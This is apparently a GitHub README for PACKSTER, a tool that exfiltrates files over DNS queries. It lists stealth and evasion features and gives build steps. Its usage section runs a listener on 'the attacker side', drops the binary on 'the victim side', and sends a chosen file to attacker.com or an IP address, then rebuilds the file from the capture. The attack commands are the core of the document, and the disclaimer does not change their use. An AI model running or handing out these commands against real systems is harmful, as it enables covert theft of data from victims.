# PACKSTER

## Overview
PACKSTER is a powerful exfiltration tool designed for demonstrating efficient data exfiltration and security testing. It allows for controlled and stealthy data exfiltration by utilizing DNS queries, making it a valuable tool for cybersecurity professionals and penetration testers.

## Features
- Fast and reliable data exfiltration
- Supports multiple transport methods
- Customizable payload handling
- Stealth mode for evasion techniques
- Logging and error handling for debugging

## Watch The Demo

[![Packster Demo]([https://img.youtube.com/vi/r4g577TrCSw/maxresdefault.jpg](https://raw.githubusercontent.com/Sayan690/Packster/refs/heads/main/resources/packster.png))](https://www.youtube.com/watch?v=r4g577TrCSw)

## Installation
### Prerequisites
Ensure you have Python installed on your system. PACKSTER requires Python 3.x.

### Clone The Repository
```bash
git clone https://github.com/Sayan690/packster.git
cd packster
```

### Get The [Release Binaries](https://github.com/Sayan690/Packster/releases/)

OR

### Compile It Locally

Requirements - pyinstaller

#### Clone The Repository
```bash
git clone https://github.com/Sayan690/packster.git
cd packster
```

#### Compile Using Pyinstaller

```bash
pyinstaller -F packety.py --icon=resources/packster.ico
```

### Install Dependencies
```bash
pip install -r requirements.txt
```

## Usage
To run PACKSTER, follow these steps:

- Start the listener on the attacker side

```bash
tcpdump -i any -w capture.pcap
```

- Transfer the [packster binary](https://github.com/Sayan690/Packster/releases/) to the victim side and execute

```bash
.\packster.exe -f C:\Path\To\File -a attacker.com

./packster.exe -f /Path/To/File -a 10.10.10.10
```

- After the process exits printing "done.", exit out from tcpdump, and run `filtrz.py`

```bash
python3 filtrz.py -a attacker.com -c capture.pcap -o output_file_name.txt
```

## Disclaimer
PACKSTER is intended for educational and security testing purposes only. The author is not responsible for any misuse of this tool.

## Author
Developed by **Sayan Ray** [@BareBones90](https://x.com/BareBones90)

## License
This project is licensed under the MIT License - see the LICENSE file for details.
